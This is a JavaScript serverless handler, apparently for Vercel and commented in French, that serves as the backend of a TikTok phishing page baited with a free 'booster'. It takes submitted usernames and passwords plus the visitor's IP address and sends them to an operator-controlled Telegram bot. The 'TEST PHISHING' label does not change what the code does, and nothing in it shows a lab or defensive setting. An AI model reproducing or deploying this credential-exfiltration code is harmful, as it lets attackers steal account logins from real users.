export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    const { user, pass, attempt } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Variables à configurer dans Vercel Settings > Environment Variables
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const text = `⚠️ *TEST PHISHING TIKTOK* ⚠️\n\n` +
                 `👤 *Utilisateur:* \`${user}\`\n` +
                 `🔑 *Mot de passe:* \`${pass}\`\n` +
                 `🔢 *Tentative:* ${attempt}\n` +
                 `🌐 *Adresse IP:* ${ip}\n` +
                 `📍 *Répertoire:* vercelbooster_tiktok_gratuit`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "Markdown"
            })
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Erreur d\'envoi Telegram' });
    }
}
